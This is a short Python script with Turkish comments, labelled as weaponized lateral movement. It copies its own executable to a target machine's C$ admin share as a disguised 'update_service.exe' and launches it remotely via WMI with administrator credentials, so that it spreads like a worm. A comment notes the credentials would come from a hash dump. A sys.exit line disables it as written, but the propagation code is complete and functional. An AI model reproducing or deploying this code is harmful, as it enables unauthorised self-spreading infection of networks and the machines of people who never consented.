import wmi
import shutil
import sys
import os

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod ağda solucan (Worm) gibi yayılır.")

print("--- WEAPONIZED LATERAL MOVEMENT ---")

def infect_network(target_ip, user, password):
    print(f"[*] Hedef: {target_ip}")
    
    # 1. DOSYA KOPYALAMA (Weaponized Part - Propagation)
    # Simülasyonda burası yoktu.
    # Virüsün çalışan kopyasını hedefin C$ (Admin Share) paylaşımına atıyoruz.
    source_virus = sys.argv[0] # Kendi dosyamız
    target_path = f"\\\\{target_ip}\\C$\\Windows\\Temp\\update_service.exe"
    
    try:
        print("[*] Virüs karşıya kopyalanıyor...")
        shutil.copy(source_virus, target_path)
        
        # 2. UZAKTAN ÇALIŞTIRMA (Execution)
        # WMI kullanarak kopyaladığımız dosyayı çalıştırıyoruz.
        c = wmi.WMI(target_ip, user=user, password=password)
        process_id, result = c.Win32_Process.Create(CommandLine="C:\\Windows\\Temp\\update_service.exe")
        
        print(f"💀 BAŞARILI: Hedef enfekte edildi (PID: {process_id}).")
        
    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == "__main__":
    # Gerçekte bu bilgiler Hash Dump (Proje 186) ile elde edilir.
    infect_network("192.168.1.50", "Administrator", "123456")